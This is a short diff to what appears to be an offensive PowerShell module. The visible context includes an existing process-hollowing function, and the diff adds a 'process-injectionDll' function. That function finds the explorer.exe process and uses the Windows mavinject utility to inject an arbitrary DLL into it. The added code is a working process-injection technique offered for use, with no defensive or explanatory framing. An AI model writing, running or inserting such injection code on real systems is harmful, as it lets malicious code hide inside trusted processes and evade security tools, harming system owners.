@@ -333,7 +333,15 @@ $process = Start-Process "holw.exe" -ArgumentList "$PcodeContent" , "$TmodeConte
 Export-ModuleMember -Function process-hollowing
 Set-Alias -Name process-hollowing -Value process-hollowing
 
-
+function process-injectionDll {
+    param (
+        [string]$DLLfile
+    )
+    $ALPID = (get-process explorer).id
+    mavinject $ALPID /INJECTRUNNING $DLLfile
+}
+Export-ModuleMember -Function process-injectionDll 
+Set-Alias -Name process-injectionDll -Value process-injectionDll
 
 
 
